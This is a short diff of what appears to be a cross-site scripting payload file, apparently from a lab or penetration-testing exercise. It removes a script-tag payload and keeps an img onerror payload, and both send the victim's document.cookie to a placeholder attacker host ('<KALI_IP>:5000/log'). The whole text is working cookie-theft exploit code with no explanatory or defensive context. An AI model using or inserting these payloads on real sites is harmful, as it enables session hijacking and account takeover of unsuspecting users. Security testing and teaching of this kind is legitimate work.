@@ -1,6 +1,1 @@
-<script>
-  var i = new Image();
-  i.src = "http://<KALI_IP>:5000/log?cookie=" + document.cookie;
-</script>
-
 <img src=x onerror="var i=new Image();i.src='http://<KALI_IP>:5000/log?cookie='+document.cookie;">
